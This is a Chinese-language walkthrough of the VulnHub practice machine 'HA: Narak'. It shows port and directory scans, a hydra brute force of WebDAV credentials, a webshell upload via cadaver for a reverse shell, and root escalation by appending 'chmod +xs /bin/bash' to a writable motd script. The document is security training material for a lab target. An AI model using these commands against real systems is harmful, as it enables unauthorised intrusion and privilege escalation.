# HA：Narak

2024-6-11 https://www.vulnhub.com/entry/ha-narak,569/

difficulty: medium

## IP

192.168.5.34

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 71bd592d221eb36b4f06bf83e1cc9243 (RSA)
|   256 f8ec45847f2933b28dfc7d07289331b0 (ECDSA)
|_  256 d09436960480331040683221cbae68f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: NARAK
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

```
gobuster -t 32 dir -u http://192.168.5.34/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html,zip -e

http://192.168.5.34/tips.txt             (Status: 200) [Size: 58]
http://192.168.5.34/index.html           (Status: 200) [Size: 2998]
http://192.168.5.34/images               (Status: 301) [Size: 313] [--> http://192.168.5.34/images/]
http://192.168.5.34/webdav               (Status: 401) [Size: 459]
```

http://192.168.5.34/tips.txt : Hint to open the door of narak can be found in creds.txt.

creds.txt 在根目录中没有，http://192.168.5.34/images/666.jpg 有个跟其他图片不一样的，下载后，看看是否有图片隐写，没发现有隐写。

http://192.168.5.34/webdav 需要 hettp basic 认证，但是目前没有用户名和密码，尝试用 cewl 收集用户名和密码，然后爆破看看能不能行：

```
cewl -d 5 'http://192.168.5.34' -w pass.txt

hydra -t 20 -L pass.txt -P pass.txt 192.168.5.34 http-get /webdav/

[80][http-get] host: 192.168.5.34   login: yamdoot   password: Swarg
```

发现用户凭据 yamdoot:Swarg, 登陆后发现是一个空目录。

使用 cadaver 上传 webshell:

```
cadaver http://192.168.5.34/webdav/
dav:/webdav/> put 5.3/8888.php
Uploading 5.3/8888.php to `/webdav/8888.php':
Progress: [=============================>] 100.0% of 5495 bytes succeeded.
```

这时已经能看到上传的 8888webshell，在 kali 上监听 8888 端口，然后触发这个 php web shell 反弹。

进行系统枚举，home 目录下发现 3 个用户：

```
www-data@ubuntu:/home$ ls
inferno  narak	yamdoot
```

在 /home/inferno 下 发现 user flag:

```
www-data@ubuntu:/home/inferno$ cat user.txt
Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}
```

其他的 sudo、suid、getcap、crontab 中都没有发现提示。根据最开始的 tips.txt 有一个 creds.txt 文件，看看能不能搜索到：

```
www-data@ubuntu:/var/spool/cron$ find / -name 'creds*' 2>/dev/null
/mnt/karma/creds.txt
```

查看 /mnt/karma/creds.txt:

```
eWFtZG9vdDpTd2FyZw==
```

进行 base64 解码，得到 yamdoot:Swarg 跟前面爆破出来的一样。

进行后续枚举，发现了 /etc/update-motd.d 这个目录里面的文件具有修改权限：

```
echo "chmod +xs /bin/bash" >> /etc/update-motd.d/00-header
```

现在需要找到一个能够登陆 ssh 的用户，来触发这个 motd.

linpeas 发现 /mnt/hell.sh 内容：

```
www-data@ubuntu:/tmp$ cat /mnt/hell.sh
#!/bin/bash

echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

进行 brainfuck 解码: chitragupt 应该是某个用户的密码。经过测试，发现是 inferno 的密码，尝试 ssh 登陆，就能触发 motd，这时/bin/bash 已经是 suid 权限：

```
www-data@ubuntu:/etc/update-motd.d$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
www-data@ubuntu:/etc/update-motd.d$ /bin/bash -p
bash-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████


Root Flag: {9440aee508b6215995219c58c8ba4b45}

!! Congrats you have finished this task !!

Contact us here:

Hacking Articles : https://twitter.com/hackinarticles

Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/

+-+-+-+-+-+ +-+-+-+-+-+-+-+
 |E|n|j|o|y| |H|A|C|K|I|N|G|
 +-+-+-+-+-+ +-+-+-+-+-+-+-+
__________________________________
```
